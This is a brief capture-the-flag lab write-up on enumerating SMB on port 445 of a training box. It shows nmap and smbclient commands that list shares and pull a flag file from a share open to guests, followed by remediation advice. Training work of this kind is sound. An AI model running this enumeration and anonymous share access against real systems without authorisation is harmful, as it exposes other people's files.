# Dancing - SMB (Port 445)

## Objective
Enumerate SMB shares and extract flag from open share.

## 1. Recon - Nmap Scan
sudo nmap -sS -Pn -p 445 -sV <TARGET-IP>
Result: 445/tcp open microsoft-ds

## 2. Enumeration - List Shares
smbclient -L <TARGET-IP> -N
Shares Found: 4
- ADMIN$
- C$
- IPC$
- WorkShares

## 3. Exploitation - Connect to WorkShares
smbclient //<TARGET-IP>/WorkShares -N
smb: \> ls
smb: \> cd James.P
smb: \> ls
smb: \> get flag.txt
smb: \> exit

## 4. Flag Extraction
cat flag.txt

## Vulnerability
- SMB Share WorkShares open to Guest / No password
- Sensitive user folder accessible

## Remediation (SOC Perspective)
- Remove Everyone / Guest access from SMB shares
- Enforce SMB signing, disable SMBv1
- Monitor Port 445 - Alert on EternalBlue / WannaCry signatures
- Audit share permissions regularly

## Skill Learned
SMB enumeration, Share mapping, Lateral movement basics
